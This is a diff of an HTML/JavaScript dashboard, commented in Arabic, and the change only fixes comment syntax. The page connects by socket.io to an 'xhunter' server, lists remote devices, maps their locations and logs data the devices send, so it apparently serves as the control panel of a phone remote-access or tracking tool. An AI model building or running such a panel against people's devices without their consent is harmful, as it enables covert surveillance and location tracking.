@@ -587,7 +587,7 @@
     <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
     <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
     <script>
-         عناصر DOM
+        // عناصر DOM
         const tabs = document.querySelectorAll('.tab');
         const panels = document.querySelectorAll('.panel');
         const statusCount = document.getElementById('statusCount');
@@ -608,7 +608,7 @@
         const notification = document.getElementById('notification');
         const notificationMessage = document.getElementById('notificationMessage');
 
-        بيانات التطبيق
+        // بيانات التطبيق
         let devices = [];
         let map = null;
         let markers = {};
@@ -616,7 +616,7 @@
         let socket = null;
         let isConnected = false;
 
-        وظائف الإشعارات
+        // وظائف الإشعارات
         function showNotification(message, type = '') {
             notificationMessage.textContent = message;
             notification.className = 'notification';
@@ -634,7 +634,7 @@
             notification.classList.remove('show');
         }
 
-        تهيئة الخريطة
+        // تهيئة الخريطة
         function initMap() {
             map = L.map('map').setView([24.0, 45.0], 5);
             
@@ -643,7 +643,7 @@
             }).addTo(map);
         }
 
-        تحديث قائمة الأجهزة
+        // تحديث قائمة الأجهزة
         function updateDeviceList(devicesData) {
             deviceList.innerHTML = '';
             
@@ -676,7 +676,7 @@
             });
         }
 
-        تحديث قائمة اختيار الأجهزة
+        // تحديث قائمة اختيار الأجهزة
         function updateDeviceSelect(devicesData) {
             deviceSelect.innerHTML = '<option value="">-- اختر جهاز --</option>';
             
@@ -688,15 +688,15 @@
             });
         }
 
-         تحديث الخريطة
+        // تحديث الخريطة
         function updateMap(devicesData) {
-             إزالة العلامات القديمة
+            // إزالة العلامات القديمة
             for (const id in markers) {
                 map.removeLayer(markers[id]);
             }
             markers = {};
             
-            إضافة العلامات الجديدة
+            // إضافة العلامات الجديدة
             devicesData.forEach(device => {
                 if (device.lat && device.lng) {
                     const marker = L.marker([device.lat, device.lng]).addTo(map)
@@ -706,18 +706,18 @@
                 }
             });
             
-            ضبط عرض الخريطة ليشمل كل العلامات
+            // ضبط عرض الخريطة ليشمل كل العلامات
             if (Object.keys(markers).length > 0) {
                 const markerGroup = new L.featureGroup(Object.values(markers));
                 map.fitBounds(markerGroup.getBounds().pad(0.1));
             }
         }
 
-         اختيار جهاز
+        // اختيار جهاز
         function selectDevice(device) {
             selectedDevice = device;
             
-            عرض بيانات الجهاز
+            // عرض بيانات الجهاز
             deviceInfo.innerHTML = `
                 <div class="data-card">
                     <h4><i class="fas fa-info-circle"></i> معلومات الأساسية</h4>
@@ -742,26 +742,26 @@
                 </div>
             `;
             
-            توجيه الخريطة إلى موقع الجهاز
+            // توجيه الخريطة إلى موقع الجهاز
             if (map && device.lat && device.lng && markers[device.id]) {
                 map.setView([device.lat, device.lng], 15);
                 markers[device.id].openPopup();
             }
         }
 
-        تبديل التبويبات
+        // تبديل التبويبات
         function switchTab(tabName) {
-             إخفاء جميع الألواح
+            // إخفاء جميع الألواح
             panels.forEach(panel => panel.classList.remove('active'));
             tabs.forEach(tab => tab.classList.remove('active'));
             
-            إظهار اللوح المحدد
+            // إظهار اللوح المحدد
             document.getElementById(`tab-${tabName}`).classList.add('active');
             
-            تفعيل الزر المحدد
+            // تفعيل الزر المحدد
             document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
             
-             إذا كانت الخريطة، نحدثها
+            // إذا كانت الخريطة، نحدثها
             if (tabName === 'map' && map) {
                 setTimeout(() => {
                     map.invalidateSize();
@@ -769,9 +769,9 @@
             }
         }
 
-        إضافة سجل جديد
+        // إضافة سجل جديد
         function addLog(message, type = 'info') {
-             إذا كان السجل لا يزال يعرض تحميل، نزيله
+            // إذا كان السجل لا يزال يعرض تحميل، نزيله
             if (logList.querySelector('.loading')) {
                 logList.innerHTML = '';
             }
@@ -796,11 +796,11 @@
             logList.appendChild(logEntry);
             logList.scrollTop = logList.scrollHeight;
             
-            تحديث آخر حدث
+            // تحديث آخر حدث
             lastEvent.textContent = new Date().toLocaleString('ar-SA');
         }
 
-        الاتصال بالخادم
+        // الاتصال بالخادم
         function connectToServer() {
             try {
                 socket = io('https://xhunter-1-2not.onrender.com', {
@@ -815,7 +815,7 @@
                     showNotification('تم الاتصال بالخادم بنجاح', 'success');
                     addLog('تم الاتصال بالخادم بنجاح', 'success');
                     
-                     طلب بيانات الأجهزة بعد الاتصال
+                    // طلب بيانات الأجهزة بعد الاتصال
                     socket.emit('getDevices');
                 });
                 
@@ -845,7 +845,7 @@
                 socket.on('deviceData', (data) => {
                     addLog(`تم استقبال بيانات من الجهاز ${data.deviceId}: ${data.type}`, 'success');
                     
-                     تحديث بيانات الجهاز المحدد إذا كان معروضًا
+                    // تحديث بيانات الجهاز المحدد إذا كان معروضًا
                     if (selectedDevice && selectedDevice.id === data.deviceId) {
                         selectDevice({...selectedDevice, ...data.data});
                     }
@@ -878,18 +878,18 @@
             }
         }
 
-         تهيئة التطبيق
+        // تهيئة التطبيق
         function initApp() {
-            تهيئة الخريطة
+            // تهيئة الخريطة
             initMap();
             
-             إضافة بعض السجلات الأولية
+            // إضافة بعض السجلات الأولية
             addLog('جاري الاتصال بالخادم...');
             
-            الاتصال بالخادم
+            // الاتصال بالخادم
             connectToServer();
             
-            أحداث الأزرار
+            // أحداث الأزرار
             tabs.forEach(tab => {
                 tab.addEventListener('click', () => {
                     switchTab(tab.dataset.tab);
@@ -958,8 +958,8 @@
             });
         }
 
-         بدء التطبيق عند تحميل الصفحة
+        // بدء التطبيق عند تحميل الصفحة
         document.addEventListener('DOMContentLoaded', initApp);
     </script>
 </body>
-</html>
+    </html>
